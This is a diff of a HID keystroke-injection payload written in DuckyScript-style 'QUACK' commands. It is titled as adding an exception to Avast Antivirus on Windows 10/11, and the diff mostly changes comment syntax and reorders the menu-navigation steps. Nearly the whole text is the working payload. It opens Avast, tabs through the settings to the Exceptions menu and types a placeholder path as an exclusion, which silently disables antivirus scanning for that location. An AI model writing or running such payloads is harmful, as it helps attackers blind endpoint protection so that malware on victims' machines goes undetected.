@@ -1,19 +1,19 @@
-* ########################################################
-* #                                                      |
-* # Title        : Add An Exception To Avast Antivirus   |
-* # Author       : Aleff                                 |
-* # Version      : 1.0                                   |
-* # Category     : Execute                               |
-* # Target       : Windows 10/11                         |
-* #                                                      |
-* ########################################################
+########################################################
+#                                                      #
+# Title        : Add An Exception To Avast Antivirus   #
+# Author       : Aleff                                 #
+# Version      : 1.0                                   #
+# Category     : Execute                               #
+# Target       : Windows 10/11                         #
+#                                                      #
+########################################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - Avast installed and configured
+# Requirements:
+#     - Avast installed and configured
 
-
-* Open Avast application
+# Open Avast application
 QUACK DELAY 2000
 QUACK GUI
 QUACK DELAY 1000
@@ -21,7 +21,7 @@ QUACK STRING avast
 QUACK DELAY 1000
 QUACK ENTER
 
-* Go to Avast menu
+# Go to Avast menu
 QUACK DELAY 1000
 QUACK TAB
 QUACK DELAY 500
@@ -31,36 +31,8 @@ QUACK TAB
 QUACK DELAY 500
 QUACK ENTER
 
-* Go to Avast settings
+# Go to Avast settings
 QUACK DELAY 1000
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK ENTER
-
-* Go to Exceptions menu
-QUACK DELAY 1000
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
-QUACK TAB
-QUACK DELAY 500
 QUACK TAB
 QUACK DELAY 500
 QUACK TAB
@@ -71,18 +43,46 @@ QUACK TAB
 QUACK DELAY 500
 QUACK ENTER
 
-* Add Exception button
+# Go to Exceptions menu
+QUACK DELAY 1000
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
 QUACK DELAY 500
 QUACK TAB
 QUACK DELAY 500
 QUACK ENTER
 
-* Write the full-path and then close the Avast app
+# Add Exception button
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK ENTER
+
+# Write the full-path and then close the Avast app
 QUACK DELAY 1000
 QUACK TAB
 QUACK DELAY 500
 
-* Set the full-path that you want to set as exception
+# Set the full-path that you want to set as exception
 QUACK STRING FULL-PATH
 QUACK DELAY 500
 QUACK TAB
